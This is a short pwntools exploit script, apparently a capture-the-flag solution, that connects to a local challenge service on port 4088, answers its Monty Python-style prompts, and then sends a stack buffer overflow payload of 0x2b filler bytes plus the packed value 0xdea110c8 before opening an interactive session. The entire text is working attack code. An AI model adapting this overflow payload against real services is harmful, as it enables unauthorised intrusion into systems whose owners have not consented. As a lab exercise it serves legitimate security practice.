from pwn import *
io = remote("localhost",4088)
io.recvuntil("name?")
io.sendline("Sir Lancelot of Camelot")
io.recvuntil("quest")
io.sendline("To seek the Holy Grail.")
io.recvuntil("secret?")
payload = b'A'*0x2b
payload += p32(0xdea110c8) 
io.sendline(payload)
io.interactive()


